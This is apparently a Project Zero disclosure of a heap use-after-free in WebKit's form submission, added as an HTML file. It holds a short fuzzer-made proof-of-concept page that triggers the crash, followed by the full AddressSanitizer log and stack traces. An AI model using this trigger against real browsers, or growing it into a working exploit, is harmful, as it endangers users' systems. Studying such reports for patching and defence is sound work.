@@ -1,0 +1,194 @@
+<!--
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1355
+
+There is a use-after-free security vulnerability in WebKit. The vulnerability was confirmed on ASan build of WebKit nightly.
+
+PoC:
+
+=================================================================
+-->
+
+<script>
+function jsfuzzer() {
+  textarea1.setRangeText("foo");
+  textarea2.autofocus = true;
+  textarea1.name = "foo";
+  form.insertBefore(textarea2, form.firstChild);
+  form.submit();
+}
+function eventhandler2() {
+  for(var i=0;i<100;i++) {
+    var e = document.createElement("input");
+    form.appendChild(e);
+  }
+}
+</script>
+<body onload=jsfuzzer()>
+<form id="form" onchange="eventhandler2()">
+<textarea id="textarea1">a</textarea>
+<object id="object"></object>
+<textarea id="textarea2">b</textarea>
+
+<!--
+=================================================================
+
+ASan log:
+
+=================================================================
+==934==ERROR: AddressSanitizer: heap-use-after-free on address 0x60c0000b9810 at pc 0x000114b6f49c bp 0x7fff511323f0 sp 0x7fff511323e8
+READ of size 8 at 0x60c0000b9810 thread T0
+==934==WARNING: invalid path to external symbolizer!
+==934==WARNING: Failed to use and restart external symbolizer!
+    #0 0x114b6f49b in WebCore::FormSubmission::create(WebCore::HTMLFormElement&, WebCore::FormSubmission::Attributes const&, WebCore::Event*, WebCore::LockHistory, WebCore::FormSubmissionTrigger) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0xb3749b)
+    #1 0x114daba4b in WebCore::HTMLFormElement::submit(WebCore::Event*, bool, bool, WebCore::FormSubmissionTrigger) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0xd73a4b)
+    #2 0x1157ef370 in WebCore::jsHTMLFormElementPrototypeFunctionSubmitBody(JSC::ExecState*, WebCore::JSHTMLFormElement*, JSC::ThrowScope&) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x17b7370)
+    #3 0x1157ec668 in long long WebCore::IDLOperation<WebCore::JSHTMLFormElement>::call<&(WebCore::jsHTMLFormElementPrototypeFunctionSubmitBody(JSC::ExecState*, WebCore::JSHTMLFormElement*, JSC::ThrowScope&)), (WebCore::CastedThisErrorBehavior)0>(JSC::ExecState&, char const*) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x17b4668)
+    #4 0x354389601027  (<unknown module>)
+    #5 0x122546e49 in llint_entry (/Users/projectzero/webkit/webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x16aae49)
+    #6 0x122546e49 in llint_entry (/Users/projectzero/webkit/webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x16aae49)
+    #7 0x12253ff6f in vmEntryToJavaScript (/Users/projectzero/webkit/webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x16a3f6f)
+    #8 0x1221a3847 in JSC::JITCode::execute(JSC::VM*, JSC::ProtoCallFrame*) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x1307847)
+    #9 0x12212488a in JSC::Interpreter::executeCall(JSC::ExecState*, JSC::JSObject*, JSC::CallType, JSC::CallData const&, JSC::JSValue, JSC::ArgList const&) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x128888a)
+    #10 0x12173d731 in JSC::call(JSC::ExecState*, JSC::JSValue, JSC::CallType, JSC::CallData const&, JSC::JSValue, JSC::ArgList const&) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x8a1731)
+    #11 0x12173d9a2 in JSC::call(JSC::ExecState*, JSC::JSValue, JSC::CallType, JSC::CallData const&, JSC::JSValue, JSC::ArgList const&, WTF::NakedPtr<JSC::Exception>&) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x8a19a2)
+    #12 0x12173dd13 in JSC::profiledCall(JSC::ExecState*, JSC::ProfilingReason, JSC::JSValue, JSC::CallType, JSC::CallData const&, JSC::JSValue, JSC::ArgList const&, WTF::NakedPtr<JSC::Exception>&) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x8a1d13)
+    #13 0x115276615 in WebCore::JSMainThreadExecState::profiledCall(JSC::ExecState*, JSC::ProfilingReason, JSC::JSValue, JSC::CallType, JSC::CallData const&, JSC::JSValue, JSC::ArgList const&, WTF::NakedPtr<JSC::Exception>&) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x123e615)
+    #14 0x1156896cd in WebCore::JSEventListener::handleEvent(WebCore::ScriptExecutionContext&, WebCore::Event&) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x16516cd)
+    #15 0x1149f5010 in WebCore::EventTarget::fireEventListeners(WebCore::Event&, WTF::Vector<WTF::RefPtr<WebCore::RegisteredEventListener>, 1ul, WTF::CrashOnOverflow, 16ul>) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x9bd010)
+    #16 0x1149f4ae0 in WebCore::EventTarget::fireEventListeners(WebCore::Event&) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x9bcae0)
+    #17 0x1148d2051 in WebCore::DOMWindow::dispatchEvent(WebCore::Event&, WebCore::EventTarget*) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x89a051)
+    #18 0x1148e1c0f in WebCore::DOMWindow::dispatchLoadEvent() (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x8a9c0f)
+    #19 0x1147d4b0f in WebCore::Document::dispatchWindowLoadEvent() (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x79cb0f)
+    #20 0x1147cebad in WebCore::Document::implicitClose() (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x796bad)
+    #21 0x114b813ed in WebCore::FrameLoader::checkCompleted() (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0xb493ed)
+    #22 0x114b7e75c in WebCore::FrameLoader::finishedParsing() (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0xb4675c)
+    #23 0x1147ee523 in WebCore::Document::finishedParsing() (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x7b6523)
+    #24 0x114d725d0 in WebCore::HTMLDocumentParser::prepareToStopParsing() (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0xd3a5d0)
+    #25 0x11488f693 in WebCore::DocumentWriter::end() (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x857693)
+    #26 0x114850736 in WebCore::DocumentLoader::finishedLoading() (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x818736)
+    #27 0x1142cc047 in WebCore::CachedResource::checkNotify() (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x294047)
+    #28 0x1142c4df1 in WebCore::CachedRawResource::finishLoading(WebCore::SharedBuffer*) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x28cdf1)
+    #29 0x116d9c661 in WebCore::SubresourceLoader::didFinishLoading(WebCore::NetworkLoadMetrics const&) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x2d64661)
+    #30 0x10f5fa43b in WebKit::WebResourceLoader::didFinishResourceLoad(WebCore::NetworkLoadMetrics const&) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebKit.framework/Versions/A/WebKit:x86_64+0xb1343b)
+    #31 0x10f5fd6d9 in void IPC::handleMessage<Messages::WebResourceLoader::DidFinishResourceLoad, WebKit::WebResourceLoader, void (WebKit::WebResourceLoader::*)(WebCore::NetworkLoadMetrics const&)>(IPC::Decoder&, WebKit::WebResourceLoader*, void (WebKit::WebResourceLoader::*)(WebCore::NetworkLoadMetrics const&)) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebKit.framework/Versions/A/WebKit:x86_64+0xb166d9)
+    #32 0x10f5fcbc9 in WebKit::WebResourceLoader::didReceiveWebResourceLoaderMessage(IPC::Connection&, IPC::Decoder&) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebKit.framework/Versions/A/WebKit:x86_64+0xb15bc9)
+    #33 0x10edee117 in WebKit::NetworkProcessConnection::didReceiveMessage(IPC::Connection&, IPC::Decoder&) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebKit.framework/Versions/A/WebKit:x86_64+0x307117)
+    #34 0x10ebcd695 in IPC::Connection::dispatchMessage(std::__1::unique_ptr<IPC::Decoder, std::__1::default_delete<IPC::Decoder> >) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebKit.framework/Versions/A/WebKit:x86_64+0xe6695)
+    #35 0x10ebd6a48 in IPC::Connection::dispatchOneMessage() (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebKit.framework/Versions/A/WebKit:x86_64+0xefa48)
+    #36 0x122bbe8e3 in WTF::RunLoop::performWork() (/Users/projectzero/webkit/webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x1d228e3)
+    #37 0x122bbf1b1 in WTF::RunLoop::performWork(void*) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x1d231b1)
+    #38 0x7fff8c5f6320 in __CFRUNLOOP_IS_CALLING_OUT_TO_A_SOURCE0_PERFORM_FUNCTION__ (/System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation:x86_64h+0xa7320)
+    #39 0x7fff8c5d721c in __CFRunLoopDoSources0 (/System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation:x86_64h+0x8821c)
+    #40 0x7fff8c5d6715 in __CFRunLoopRun (/System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation:x86_64h+0x87715)
+    #41 0x7fff8c5d6113 in CFRunLoopRunSpecific (/System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation:x86_64h+0x87113)
+    #42 0x7fff8bb36ebb in RunCurrentEventLoopInMode (/System/Library/Frameworks/Carbon.framework/Versions/A/Frameworks/HIToolbox.framework/Versions/A/HIToolbox:x86_64+0x30ebb)
+    #43 0x7fff8bb36cf0 in ReceiveNextEventCommon (/System/Library/Frameworks/Carbon.framework/Versions/A/Frameworks/HIToolbox.framework/Versions/A/HIToolbox:x86_64+0x30cf0)
+    #44 0x7fff8bb36b25 in _BlockUntilNextEventMatchingListInModeWithFilter (/System/Library/Frameworks/Carbon.framework/Versions/A/Frameworks/HIToolbox.framework/Versions/A/HIToolbox:x86_64+0x30b25)
+    #45 0x7fff8a0cfa53 in _DPSNextEvent (/System/Library/Frameworks/AppKit.framework/Versions/C/AppKit:x86_64+0x46a53)
+    #46 0x7fff8a84b7ed in -[NSApplication(NSEvent) _nextEventMatchingEventMask:untilDate:inMode:dequeue:] (/System/Library/Frameworks/AppKit.framework/Versions/C/AppKit:x86_64+0x7c27ed)
+    #47 0x7fff8a0c43da in -[NSApplication run] (/System/Library/Frameworks/AppKit.framework/Versions/C/AppKit:x86_64+0x3b3da)
+    #48 0x7fff8a08ee0d in NSApplicationMain (/System/Library/Frameworks/AppKit.framework/Versions/C/AppKit:x86_64+0x5e0d)
+    #49 0x7fffa1faf8c6 in _xpc_objc_main (/usr/lib/system/libxpc.dylib:x86_64+0x108c6)
+    #50 0x7fffa1fae2e3 in xpc_main (/usr/lib/system/libxpc.dylib:x86_64+0xf2e3)
+    #51 0x10eaca56c in main (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebKit.framework/Versions/A/XPCServices/com.apple.WebKit.WebContent.xpc/Contents/MacOS/com.apple.WebKit.WebContent.Development:x86_64+0x10000156c)
+    #52 0x7fffa1d56234 in start (/usr/lib/system/libdyld.dylib:x86_64+0x5234)
+
+0x60c0000b9810 is located 16 bytes inside of 128-byte region [0x60c0000b9800,0x60c0000b9880)
+freed by thread T0 here:
+    #0 0x111d32294 in __sanitizer_mz_free (/Applications/Xcode.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/lib/clang/8.1.0/lib/darwin/libclang_rt.asan_osx_dynamic.dylib:x86_64h+0x57294)
+    #1 0x122c0e650 in bmalloc::Deallocator::deallocateSlowCase(void*) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x1d72650)
+    #2 0x114db0a77 in WTF::Vector<WebCore::FormAssociatedElement*, 0ul, WTF::CrashOnOverflow, 16ul>::expandCapacity(unsigned long, WebCore::FormAssociatedElement**) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0xd78a77)
+    #3 0x114dad5cf in void WTF::Vector<WebCore::FormAssociatedElement*, 0ul, WTF::CrashOnOverflow, 16ul>::insert<WebCore::FormAssociatedElement*&>(unsigned long, WebCore::FormAssociatedElement*&&&) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0xd755cf)
+    #4 0x114dad43f in WebCore::HTMLFormElement::registerFormElement(WebCore::FormAssociatedElement*) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0xd7543f)
+    #5 0x114b20fd8 in WebCore::FormAssociatedElement::setForm(WebCore::HTMLFormElement*) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0xae8fd8)
+    #6 0x114b2196e in WebCore::FormAssociatedElement::resetFormOwner() (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0xae996e)
+    #7 0x114dcbe6d in WebCore::HTMLInputElement::finishedInsertingSubtree() (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0xd93e6d)
+    #8 0x114404e08 in WebCore::ContainerNode::notifyChildInserted(WebCore::Node&, WebCore::ContainerNode::ChildChange const&) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x3cce08)
+    #9 0x1144049a2 in WebCore::ContainerNode::updateTreeAfterInsertion(WebCore::Node&, WebCore::ContainerNode::ReplacedAllChildren) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x3cc9a2)
+    #10 0x1144042ba in WebCore::ContainerNode::appendChildWithoutPreInsertionValidityCheck(WebCore::Node&) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x3cc2ba)
+    #11 0x1144072f8 in WebCore::ContainerNode::appendChild(WebCore::Node&) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x3cf2f8)
+    #12 0x1163be49d in WebCore::Node::appendChild(WebCore::Node&) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x238649d)
+    #13 0x115a321e6 in WebCore::jsNodePrototypeFunctionAppendChildBody(JSC::ExecState*, WebCore::JSNode*, JSC::ThrowScope&) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x19fa1e6)
+    #14 0x115a2c648 in long long WebCore::IDLOperation<WebCore::JSNode>::call<&(WebCore::jsNodePrototypeFunctionAppendChildBody(JSC::ExecState*, WebCore::JSNode*, JSC::ThrowScope&)), (WebCore::CastedThisErrorBehavior)0>(JSC::ExecState&, char const*) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x19f4648)
+    #15 0x354389601027  (<unknown module>)
+    #16 0x122546dd7 in llint_entry (/Users/projectzero/webkit/webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x16aadd7)
+    #17 0x122546e49 in llint_entry (/Users/projectzero/webkit/webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x16aae49)
+    #18 0x12253ff6f in vmEntryToJavaScript (/Users/projectzero/webkit/webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x16a3f6f)
+    #19 0x1221a3847 in JSC::JITCode::execute(JSC::VM*, JSC::ProtoCallFrame*) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x1307847)
+    #20 0x12212488a in JSC::Interpreter::executeCall(JSC::ExecState*, JSC::JSObject*, JSC::CallType, JSC::CallData const&, JSC::JSValue, JSC::ArgList const&) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x128888a)
+    #21 0x12173d731 in JSC::call(JSC::ExecState*, JSC::JSValue, JSC::CallType, JSC::CallData const&, JSC::JSValue, JSC::ArgList const&) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x8a1731)
+    #22 0x12173d9a2 in JSC::call(JSC::ExecState*, JSC::JSValue, JSC::CallType, JSC::CallData const&, JSC::JSValue, JSC::ArgList const&, WTF::NakedPtr<JSC::Exception>&) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x8a19a2)
+    #23 0x12173dd13 in JSC::profiledCall(JSC::ExecState*, JSC::ProfilingReason, JSC::JSValue, JSC::CallType, JSC::CallData const&, JSC::JSValue, JSC::ArgList const&, WTF::NakedPtr<JSC::Exception>&) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x8a1d13)
+    #24 0x115276615 in WebCore::JSMainThreadExecState::profiledCall(JSC::ExecState*, JSC::ProfilingReason, JSC::JSValue, JSC::CallType, JSC::CallData const&, JSC::JSValue, JSC::ArgList const&, WTF::NakedPtr<JSC::Exception>&) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x123e615)
+    #25 0x1156896cd in WebCore::JSEventListener::handleEvent(WebCore::ScriptExecutionContext&, WebCore::Event&) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x16516cd)
+    #26 0x1149f5010 in WebCore::EventTarget::fireEventListeners(WebCore::Event&, WTF::Vector<WTF::RefPtr<WebCore::RegisteredEventListener>, 1ul, WTF::CrashOnOverflow, 16ul>) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x9bd010)
+    #27 0x1149f4ae0 in WebCore::EventTarget::fireEventListeners(WebCore::Event&) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x9bcae0)
+    #28 0x1149bcb97 in WebCore::EventContext::handleLocalEvents(WebCore::Event&) const (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x984b97)
+    #29 0x1149bdbde in WebCore::dispatchEventInDOM(WebCore::Event&, WebCore::EventPath const&) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x985bde)
+
+previously allocated by thread T0 here:
+    #0 0x111d31d2c in __sanitizer_mz_malloc (/Applications/Xcode.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/lib/clang/8.1.0/lib/darwin/libclang_rt.asan_osx_dynamic.dylib:x86_64h+0x56d2c)
+    #1 0x7fffa1ed8281 in malloc_zone_malloc (/usr/lib/system/libsystem_malloc.dylib:x86_64+0x2281)
+    #2 0x122c0ead4 in bmalloc::DebugHeap::malloc(unsigned long) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x1d72ad4)
+    #3 0x122c0cd6d in bmalloc::Allocator::allocateSlowCase(unsigned long) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x1d70d6d)
+    #4 0x122b93247 in bmalloc::Allocator::allocate(unsigned long) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x1cf7247)
+    #5 0x122b9263a in WTF::fastMalloc(unsigned long) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x1cf663a)
+    #6 0x114d97a90 in WTF::VectorBufferBase<WebCore::FormAssociatedElement*>::allocateBuffer(unsigned long) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0xd5fa90)
+    #7 0x114d97df3 in WTF::Vector<WebCore::FormAssociatedElement*, 0ul, WTF::CrashOnOverflow, 16ul>::reserveCapacity(unsigned long) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0xd5fdf3)
+    #8 0x114db0a77 in WTF::Vector<WebCore::FormAssociatedElement*, 0ul, WTF::CrashOnOverflow, 16ul>::expandCapacity(unsigned long, WebCore::FormAssociatedElement**) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0xd78a77)
+    #9 0x114dad5cf in void WTF::Vector<WebCore::FormAssociatedElement*, 0ul, WTF::CrashOnOverflow, 16ul>::insert<WebCore::FormAssociatedElement*&>(unsigned long, WebCore::FormAssociatedElement*&&&) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0xd755cf)
+    #10 0x114dad43f in WebCore::HTMLFormElement::registerFormElement(WebCore::FormAssociatedElement*) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0xd7543f)
+    #11 0x114b20fd8 in WebCore::FormAssociatedElement::setForm(WebCore::HTMLFormElement*) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0xae8fd8)
+    #12 0x114b212d3 in WebCore::FormAssociatedElement::insertedInto(WebCore::ContainerNode&) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0xae92d3)
+    #13 0x114d9f8b0 in WebCore::HTMLFormControlElement::insertedInto(WebCore::ContainerNode&) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0xd678b0)
+    #14 0x114e80f59 in WebCore::HTMLTextFormControlElement::insertedInto(WebCore::ContainerNode&) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0xe48f59)
+    #15 0x114416e68 in WebCore::notifyNodeInsertedIntoDocument(WebCore::ContainerNode&, WebCore::Node&, WTF::Vector<WTF::Ref<WebCore::Node>, 11ul, WTF::CrashOnOverflow, 16ul>&) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x3dee68)
+    #16 0x114416cad in WebCore::notifyChildNodeInserted(WebCore::ContainerNode&, WebCore::Node&, WTF::Vector<WTF::Ref<WebCore::Node>, 11ul, WTF::CrashOnOverflow, 16ul>&) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x3decad)
+    #17 0x114404d67 in WebCore::ContainerNode::notifyChildInserted(WebCore::Node&, WebCore::ContainerNode::ChildChange const&) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x3ccd67)
+    #18 0x114403396 in WebCore::ContainerNode::parserAppendChild(WebCore::Node&) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x3cb396)
+    #19 0x114d4acdc in WebCore::executeInsertTask(WebCore::HTMLConstructionSiteTask&) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0xd12cdc)
+    #20 0x114d43ea7 in WebCore::HTMLConstructionSite::executeQueuedTasks() (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0xd0bea7)
+    #21 0x114d73c8a in WebCore::HTMLDocumentParser::constructTreeFromHTMLToken(WebCore::HTMLTokenizer::TokenPtr&) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0xd3bc8a)
+    #22 0x114d73849 in WebCore::HTMLDocumentParser::pumpTokenizerLoop(WebCore::HTMLDocumentParser::SynchronousMode, bool, WebCore::PumpSession&) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0xd3b849)
+    #23 0x114d729c2 in WebCore::HTMLDocumentParser::pumpTokenizer(WebCore::HTMLDocumentParser::SynchronousMode) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0xd3a9c2)
+    #24 0x114d744e8 in WebCore::HTMLDocumentParser::append(WTF::RefPtr<WTF::StringImpl>&&) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0xd3c4e8)
+    #25 0x114752531 in WebCore::DecodedDataDocumentParser::flush(WebCore::DocumentWriter&) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x71a531)
+    #26 0x11488f63d in WebCore::DocumentWriter::end() (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x85763d)
+    #27 0x114850736 in WebCore::DocumentLoader::finishedLoading() (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x818736)
+    #28 0x1142cc047 in WebCore::CachedResource::checkNotify() (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x294047)
+    #29 0x1142c4df1 in WebCore::CachedRawResource::finishLoading(WebCore::SharedBuffer*) (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x28cdf1)
+
+SUMMARY: AddressSanitizer: heap-use-after-free (/Users/projectzero/webkit/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0xb3749b) in WebCore::FormSubmission::create(WebCore::HTMLFormElement&, WebCore::FormSubmission::Attributes const&, WebCore::Event*, WebCore::LockHistory, WebCore::FormSubmissionTrigger)
+Shadow bytes around the buggy address:
+  0x1c18000172b0: fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00
+  0x1c18000172c0: 00 00 00 00 00 00 00 00 fa fa fa fa fa fa fa fa
+  0x1c18000172d0: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
+  0x1c18000172e0: fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd
+  0x1c18000172f0: fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa
+=>0x1c1800017300: fd fd[fd]fd fd fd fd fd fd fd fd fd fd fd fd fd
+  0x1c1800017310: fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00
+  0x1c1800017320: 00 00 00 00 00 00 00 fa fa fa fa fa fa fa fa fa
+  0x1c1800017330: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x1c1800017340: fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00
+  0x1c1800017350: 00 00 00 00 00 00 00 00 fa fa fa fa fa fa fa fa
+Shadow byte legend (one shadow byte represents 8 application bytes):
+  Addressable:           00
+  Partially addressable: 01 02 03 04 05 06 07 
+  Heap left redzone:       fa
+  Freed heap region:       fd
+  Stack left redzone:      f1
+  Stack mid redzone:       f2
+  Stack right redzone:     f3
+  Stack after return:      f5
+  Stack use after scope:   f8
+  Global redzone:          f9
+  Global init order:       f6
+  Poisoned by user:        f7
+  Container overflow:      fc
+  Array cookie:            ac
+  Intra object redzone:    bb
+  ASan internal:           fe
+  Left alloca redzone:     ca
+  Right alloca redzone:    cb
+==934==ABORTING
+-->
